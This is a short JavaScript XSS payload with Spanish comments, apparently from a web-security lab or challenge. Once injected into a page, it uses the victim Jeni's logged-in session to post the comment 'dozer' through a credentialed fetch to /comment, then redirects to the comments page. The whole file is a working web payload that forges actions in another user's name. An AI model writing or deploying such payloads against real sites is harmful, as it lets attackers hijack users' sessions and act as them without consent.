// payload.js - Script para que Jeni comente "dozer" automáticamente
(async () => {
  console.log("[XSS] Script ejecutado en la sesión de Jeni");

  try {
    // Paso 1: Preparar el comentario "dozer"
    const formData = new FormData();
    formData.append("content", "dozer");

    // Paso 2: Enviar el comentario usando la sesión de Jeni
    const response = await fetch("/comment", {
      method: "POST",
      body: formData,
      credentials: "include"
    });

    if (response.ok) {
      console.log("[XSS] Comentario 'dozer' enviado exitosamente con la cuenta de Jeni");
      
      // Opcional: Redirigir a comentarios para ver el comentario publicado
      setTimeout(() => {
        window.location.href = "/comments";
      }, 1500);
      
    } else {
      console.log("[XSS] Error al enviar comentario:", response.status);
    }

  } catch (err) {
    console.error("[XSS] Error al ejecutar el script:", err);
  }
})();
